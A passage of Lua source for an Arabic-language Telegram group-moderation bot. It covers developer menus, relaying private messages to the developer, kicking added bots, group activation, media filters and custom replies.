DevAbs:incr(David..'Abs:UsersMsgs'..David..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(David..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(David..'Abs:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevAbs:sismember(David.."Abs:Users",msg.chat_id_) then
DevAbs:sadd(David.."Abs:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
if ChatType == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌁︙مرحبا عزيزي المطور \n⌁︙انت المطور الاساسي هنا \n⌁︙اليك ازرار سورس ديف ديفد \n⌁︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'وضع اسم البوت','↫ تحديث ⌁','وضع كليشه المطور'},
{'↫ المطورين ⌁','↫ الاحصائيات ⌁'},
{'↫ المجموعات ⌁','روابط الكروبات','↫ المشتركين ⌁'},
{'↫ تعطيل التواصل ⌁','↫ تفعيل التواصل ⌁'},
{'تنظيف الكروبات','↫ قائمه العام ⌁','تنظيف المشتركين'},
{'↫ تغير المطور الاساسي ⌁'},
{'تعطيل ترحيب البوت','تفعيل ترحيب البوت'},
{'↫ تغير معلومات الترحيب ⌁'},
{'↫ تعطيل المغادره ⌁','↫ تفعيل المغادره ⌁'},
{'↫ تعطيل الاذاعه ⌁','↫ تفعيل الاذاعه ⌁'},
{'↫ اذاعه بالتثبيت ⌁'},
{'↫ اذاعه عام ⌁','↫ اذاعه خاص ⌁'},
{'↫ اذاعه عام بالتوجيه ⌁','↫ اذاعه خاص بالتوجيه ⌁'},
{'~ تعيين كلايش الاوامر ~'},
{'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
{'جلب نسخه السورس','تحديث السورس','جلب نسخه الكروبات'},
{'↫ حذف رد عام ⌁','↫ الردود العام ⌁','↫ اضف رد عام ⌁'},
{'↫ حذف رد الخاص ⌁','↫ تعيين رد الخاص ⌁'},
{'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
{'حذف كليشه الاشتراك','كليشه الاشتراك','تغير كليشه الاشتراك'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ تعيين كلايش الاوامر ~' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌁︙اهلا بك مجددا عزيزي المطور \n⌁︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس ديف ديفد فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/start' and ChCheck(msg) then  
if not DevAbs:get(David..'Abs:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {{{text="⌁ المطور .",url="t.me/"..(dp.username_ or "X7PX7")}}}
local start = DevAbs:get(David.."Abs:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙اختصاصي حماية المجموعات\n⌁︙من التفليش والسبام والخخ .. . ،\n⌁︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
DevAbs:setex(David..'Abs:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
if not SecondSudo(msg) and not DevAbs:sismember(David..'Abs:Ban:Pv',msg.sender_user_id_) and not DevAbs:get(David..'Abs:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Abs(msg.sender_user_id_, msg.id_, 1, '⌁︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "X7PX7")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'⌁︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevAbs:sadd(David..'Abs:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevAbs:srem(David..'Abs:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_Abs(id_user, 0, 1, text, 1, "md")  
Text = '⌁︙تم ارسال الرساله الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '⌁︙تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '⌁︙تم ارسال الصوره الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '⌁︙تم ارسال المتحركه الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '⌁︙تم ارسال البصمه الى ↫ ⤈'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
if text and DevAbs:get(David..'Abs:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevAbs:del(David..'Abs:Start:Bots'..msg.sender_user_id_) 
return false
end
DevAbs:set(David.."Abs:Start:Bot",text)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الستارت', 1, 'md')
DevAbs:del(David..'Abs:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص ⌁' then 
DevAbs:set(David..'Abs:Start:Bots'..msg.sender_user_id_,true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص ⌁' then 
DevAbs:del(David..'Start:Bot') 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' then  
local start = DevAbs:get(David.."Abs:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙اختصاصي حماية المجموعات\n⌁︙من التفليش والسبام والخخ .. . ،\n⌁︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل ⌁' then   
local DavidTEAM = '⌁︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n⌁︙تم تفعيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(David..'Abs:Texting:Pv') 
end
if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل ⌁' then  
local DavidTEAM = '⌁︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n⌁︙تم تعطيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(David..'Abs:Texting:Pv',true) 
end
end
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
DevAbs:incr(David..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:set(David.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevAbs:get(David.."Abs:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevAbs:sadd(David..'Abs:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(David) then 
DevAbs:srem(David.."Abs:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) then
SendText(DevId,"⌁︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevAbs:get(David..'Abs:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevAbs:incr(David..'Abs:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevAbs:incr(David..'Abs:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:FreeBot'..David) then
if ChatType == 'pv' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
DevAbs:del(David..'Abs:AbsConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAbs:sadd(David..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevAbs:sadd(David..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAbs:sadd(David.."Abs:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbs:sadd(David.."Abs:AbsConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(David.."Abs:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbs:srem(David.."Abs:AbsConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevAbs:sismember(David..'Abs:Groups',msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevAbs:get(David..'Abs:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevAbs:get(David..'Abs:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تفعيل المجموعه "..dp.title_)  
DevAbs:sadd(David.."Abs:Groups",msg.chat_id_)
DevAbs:sadd(David..'Abs:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAbs:set(David.."Abs:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙موقعه في المجموعه ↫ "..status.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevAbs:set(David..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
local ReFalse = tostring(msg.chat_id_)
if not DevAbs:sismember(David.."Abs:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False [ Not Enable ]")
return false
end
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if DevAbs:get(David.."Abs:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Manager(msg) then 
local filter = DevAbs:smembers(David.."Abs:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙الصوره التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Manager(msg) then 
local filter = DevAbs:smembers(David.."Abs:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙المتحركه التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Manager(msg) then 
local filter = DevAbs:smembers(David.."Abs:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙الملصق الذي ارسلته تم منعه من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevAbs:get(David..'Abs:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if DelGpRed == 'DelGpRed' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAbs:del(David..'Abs:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(David..'Abs:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(David..'Abs:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(David..'Abs:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(David..'Abs:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(David..'Abs:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(David..'Abs:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(David..'Abs:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(David..'Abs:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:srem(David..'Abs:Manager:GpRed'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevAbs:get(David.."Abs:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAbs:del(David.."Abs:Add:AllRed"..msg.sender_user_id_)
DevAbs:del(David.."Abs:Gif:AllRed"..msg.content_.text_)
DevAbs:del(David.."Abs:Voice:AllRed"..msg.content_.text_)
DevAbs:del(David.."Abs:Audio:AllRed"..msg.content_.text_)
DevAbs:del(David.."Abs:Photo:AllRed"..msg.content_.text_)
DevAbs:del(David.."Abs:Stecker:AllRed"..msg.content_.text_)
DevAbs:del(David.."Abs:Video:AllRed"..msg.content_.text_)
DevAbs:del(David.."Abs:File:AllRed"..msg.content_.text_)
DevAbs:del(David.."Abs:Text:AllRed"..msg.content_.text_)
DevAbs:del(David.."Abs:Sudo:AllRed",msg.content_.text_)
return false
end
end
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevAbs:get(David..'Abs:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevAbs:get(David..'DelManagerRep'..msg.chat_id_..'')
DevAbs:srem(David..'Abs:Manager:GpRed'..msg.chat_id_..'',DelManagerRep)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
DevAbs:del(David..'Abs:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(David..'Abs:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_)
DevAbs:del(David..'DelManagerRep'..msg.chat_id_..'')
return false
end
DevAbs:del(David..'Abs:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
local SaveGpRed = DevAbs:get(David..'Abs:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then DevAbs:set(David..'Abs:Video:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevAbs:set(David..'Abs:File:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevAbs:set(David..'Abs:Stecker:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevAbs:set(David..'Abs:Voice:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
